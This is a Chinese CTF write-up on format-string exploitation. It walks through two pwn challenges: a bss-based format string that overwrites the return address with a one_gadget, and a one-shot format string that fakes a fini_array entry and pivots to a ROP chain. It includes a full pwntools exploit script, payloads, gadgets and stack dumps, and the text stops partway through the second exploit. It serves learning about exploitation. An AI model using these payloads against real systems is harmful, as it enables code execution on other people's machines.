# 格式化字符串大杂烩
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
L0ck@星盟
一直对格式化字符串的利用不是很上手，所以决定做个总结，复现一些骚题目还有一些常规题，bss段的格式化字符串和正常的栈上的格式化字符串利用，希望通过这次总结能加深对格式化字符串利用的理解。
## 0x1.ha1cyon-ctf level2
除了canary以外保护全开
IDA分析
无限循环的格式化字符串漏洞，不过是bss段的。
bss段或堆上的的格式化字符串利用，我们需要在栈上找一个二级指针，类似于下面这种
因为我们需要修改返回地址，但通过格式化字符串漏洞直接修改返回地址是行不通的，我们需要间接修改返回地址，如下
    00:0000│ rsp  0x7fffffffde08 —▸ 0x555555554824 (main+138) ◂— jmp    0x5555555547da
    01:0008│ rbp  0x7fffffffde10 —▸ 0x555555554830 (__libc_csu_init) ◂— push   r15
    02:0010│      0x7fffffffde18 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
    03:0018│      0x7fffffffde20 ◂— 0x1
    04:0020│      0x7fffffffde28 —▸ 0x7fffffffdef8 —▸ 0x7fffffffe264 ◂— 0x6f6c2f656d6f682f ('/home/lo')
    有这样一条链
    0x7fffffffde28 —▸ 0x7fffffffdef8 —▸ 0x7fffffffe264 ◂— 0x6f6c2f656d6f682f ('/home/lo')
    我们可以将这条链指向返回地址，即修改成如下所示的链
    0x7fffffffde28 —▸ 0x7fffffffdef8 —▸ 0x7fffffffde18 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov edi, eax
    0x7fffffffe264和0x7fffffffde18只有后四位不同，通过格式化字符串我们可以修改0x7fffffffe264的后四位为0x7fffffffde18的后四位，这样我们就能通过修改栈上的值来修改返回地址了
首先我们泄露出libc地址和栈地址，这两个地址分别用`%7$p`和`%9$p`就能泄露
接着我们来完成上面说的修改栈链
    0x7fffffffde28 —▸ 0x7fffffffdef8 —▸ 0x7fffffffe264 ◂— 0x6f6c2f656d6f682f ('/home/lo')
这条链在格式化字符串中是`%9`  
我们通过如下payload来修改它的指向
    payload = "%"+str(stack&0xffff)+"c"+"%9$hnxxxx\x00"
修改完成后如下
这样栈里面就存在了指向返回地址的二级指针，我们只要修改`00f0`处栈所指向的值就能修改返回地址了。
由于返回地址和onegadget地址只有后五位不一样，所以我们只需要通过格式化字符串修改返回地址得后三个字节即可，不用全部写入。
00f0的栈在格式化字符串中的位置是`%35`，我们第一次修改两字节，也就是用`%35$hn`进行写入，payload如下
    payload = "%"+str(onegadget & 0xffff)+"c"+"%35$hnxxxx\x00"
修改后如下所示
接着我们来修改剩下的两字节。
我们需要再次修改`0020`处的栈链，使其偏移四位，即现在是`0x7ffe5519af48`,我们将其修改为`0x7ffe5519af4a`，这样就能够修改后四位的值，payload为
    payload = "%"+str(stack&0xffff+2)+"c"+"%9$hnxxxx\x00" #因为是以字节为单位偏移，所以+2就是偏移两字节，即偏移四位
修改了偏移之后就可以继续修改%35的栈值，进行最后的修改
    payload = "%"+str((onegadget >> 16) & 0xffff)+"c"+"%35$hnxxxx\x00"
修改完成后栈如下
返回地址已经被修改为了onegadget，然后输入66666666退出循环就能触发onegadget，完整exp如下
    #!/usr/bin/python
    from pwn import *
    context.log_level='debug'
    io = process("./level2")
    elf = ELF('level2')
    libc = ELF('libc-2.27_x64.so')
    payload = "%6$p%7$p%9$p"
    io.send(payload)
    pro_base = int(io.recv(14), 16)-0x830
    libc_base = int(io.recv(14), 16)-libc.symbols['__libc_start_main']-231
    stack = int(io.recv(14), 16)-232
    log.success('pro_base => {}'.format(hex(pro_base)))
    log.success('libc_base => {}'.format(hex(libc_base)))
    log.success('stack => {}'.format(hex(stack)))
    onegadget = libc_base+0x4f322
    offset0 = stack & 0xffff
    offset1 = onegadget & 0xffff
    offset2 = (onegadget >> 16) & 0xffff
    log.success('onegadget => {}'.format(hex(onegadget)))
    log.success('offset0 => {}'.format(hex(offset0)))
    log.success('offset1 => {}'.format(hex(offset1)))
    log.success('offset2 => {}'.format(hex(offset2)))
    #gdb.attach(io)
    payload = "%"+str(offset0+8)+"c"+"%9$hnxxxx\x00"
    io.sendline(payload)
    io.recvuntil("xxxx")
    payload = "%"+str(offset1)+"c"+"%35$hnxxxx\x00"
    io.sendline(payload)
    io.recvuntil("xxxx")
    payload = "%"+str(offset0+10)+"c"+"%9$hnxxxx\x00"
    io.sendline(payload)
    io.recvuntil("xxxx")
    payload = "%"+str(offset2)+"c"+"%35$hnxxxx\x00"
    io.sendline(payload)
    io.recvuntil("xxxx")
    io.sendline("66666666\x00")
    io.interactive()
## 0x2.De1ta ctf-unprintable
这题可以说是上一题的升级版
首先检查保护
IDA分析
程序首先给我们了栈地址，然后关闭标准输出，只有一次格式化字符串利用机会，之后就通过exit函数退出
由于第一次printf调用栈中不存在可利用的数据
根据上一题修改返回地址的利用，我们无法通过第一次printf直接修改返回地址，因此需要利用别的办法
在exit函数中会调用_dl_fini函数
其中的`l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`指向`fini_array`段的地址，而`l->l_addr`为0，所以`l->l_addr+
l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`=0x600DD8
在printf函数下断点，此时栈空间如下
这个画框的实际上就是`l->l_addr`
在后续调用_dl_fini的过程中，有如下语句
`_dl_fini`+788这条语句将[rbx]和r12相加，rbx里面存储的是fini_array的地址，rbx里面存储着的正是`l->l_addr`，也就是调用printf时栈中`_dl_init`+139上一行的值。因此我们可以通过格式化字符串修改`l->l_addr`的值，使`l->l_addr+
l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`偏移到buf中，然后在buf中伪造fini_array里面的函数为main函数，这样就能够再次执行程序。
`l->l_addr`在printf中的偏移为%26，buf的地址为`0x601060`，fini_array的地址是`0x600dd8`，相差0x288，payload如下
    payload = "%"+str(0x298)+"c%26$hn"
    payload = payload.ljust(0x10,'\x00')+p64(0x4007A3)
因为我们输入的格式化字符要占一定空间，所以伪造的fini_array还需要往后挪一挪。伪造的fini函数直接从main函数中的read函数开始执行，这是为了避免从头执行会再一次初始化栈空间，这样我们做的就是无用功。
看到第二次执行printf时的栈空间
此时我们就可以直接通过格式化字符串来修改返回地址了
接下来的利用思路就是在buf中写入ROP链，rop用来修改stderr为onegadget，格式化字符串用来修改printf函数的返回地址为pop
rsp，将返回地址的下一行修改为rop链的起始地址，这样当printf函数结束时就会执行rop链。
用到的gadget如下
    pop_rsp = 0x000000000040082d
    #0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    csu_pop = 0x000000000040082A
    '''
    .text:000000000040082A                 pop     rbx
    .text:000000000040082B                 pop     rbp
    .text:000000000040082C                 pop     r12
    .text:000000000040082E                 pop     r13
    .text:0000000000400830                 pop     r14
    .text:0000000000400832                 pop     r15
    .text:0000000000400834                 retn
    '''
    csu_call = 0x0000000000400810
    '''
    .text:0000000000400810                 mov     rdx, r13
    .text:0000000000400813                 mov     rsi, r14
    .text:0000000000400816                 mov     edi, r15d
    .text:0000000000400819                 call    ds:(__frame_dummy_init_array_entry - 600DD0h)[r12+rbx*8]
    '''
    #万能gadget
    stderr_ptr_addr = 0x0000000000601040
    stdout_ptr_addr = 0x0000000000601020
    adc_p_rbp_edx = 0x00000000004006E8
    '''
    .text:00000000004006E8 adc     [rbp+48h], edx
    .text:00000000004006EB mov     ebp, esp
    .text:00000000004006ED call    deregister_tm_clones
    .text:00000000004006F2 pop     rbp
    .text:00000000004006F3 mov     cs:completed_7594, 1
    .text:00000000004006FA rep retn
    '''
`adc [rbp+48h],
edx`这一条gadget可以用来的意思是将edx的值和[rbp+0x48]的值相加，并将结果存储在rbp+0x48中，我们可以将edx的值设置为onegadget和`_IO_2_1_stderr`的地址的差，将rbp设置为`stderr_ptr_addr-0x48`，于是通过这条指令就可以将`_IO_2_1_stderr`改写为onegadget。
现在开始完整的讲述利用流程，在第二次printf中，栈空间如下
    00:0000│ rsp  0x7ffdcc6a2410 —▸ 0x4007c6 (main+160) ◂— mov    edi, 0
    01:0008│      0x7ffdcc6a2418 —▸ 0x7fb6ff903e27 (_dl_fini+823) ◂— test   r13d, r13d
    02:0010│ r14  0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x298
    03:0018│      0x7ffdcc6a2428 —▸ 0x7fb6ffb1a700 —▸ 0x7ffdcc763000 ◂— jg     0x7ffdcc763047
    04:0020│      0x7ffdcc6a2430 —▸ 0x7fb6ffafc000 —▸ 0x7fb6ff529000 ◂— jg     0x7fb6ff529047
    05:0028│ r10  0x7ffdcc6a2438 —▸ 0x7fb6ffb199d8 (_rtld_global+2456) —▸ 0x7fb6ff8f3000 ◂— jg     0x7fb6ff8f3047
    06:0030│      0x7ffdcc6a2440 —▸ 0x7ffdcc6a2540 —▸ 0x4007d0 (__libc_csu_init) ◂— push   r15
    07:0038│      0x7ffdcc6a2448 —▸ 0x7fb6ff903b74 (_dl_fini+132) ◂— mov    ecx, dword ptr [r12]
    08:0040│      0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x298
    09:0048│      0x7ffdcc6a2458 ◂— 0x3000000010
    0a:0050│      0x7ffdcc6a2460 —▸ 0x7ffdcc6a2530 —▸ 0x7ffdcc6a2620 ◂— 0x1
    0b:0058│      0x7ffdcc6a2468 —▸ 0x7ffdcc6a2470 —▸ 0x7ffdcc763280 ◂— add    byte ptr ss:[rax], al /* '6' */
    0c:0060│      0x7ffdcc6a2470 —▸ 0x7ffdcc763280 ◂— add    byte ptr ss:[rax], al /* '6' */
    0d:0068│      0x7ffdcc6a2478 —▸ 0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x298
    0e:0070│      0x7ffdcc6a2480 ◂— 0x400001000
    0f:0078│      0x7ffdcc6a2488 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x298
    10:0080│      0x7ffdcc6a2490 ◂— 0x400000000
    11:0088│      0x7ffdcc6a2498 —▸ 0x7fb6ffb19048 (_rtld_global+8) ◂— 0x4
    12:0090│      0x7ffdcc6a24a0 —▸ 0x7ffdcc6a2410 —▸ 0x4007c6 (main+160) ◂— mov    edi, 0
通过0090的栈我们可以修改返回地址，使程序重复读取，我们还需要将0008处的栈修改为rop链的存储地址
    01:0008│      0x7ffdcc6a2418 —▸ 0x7fb6ff903e27 (_dl_fini+823) ◂— test   r13d, r13d
    08:0040│      0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x298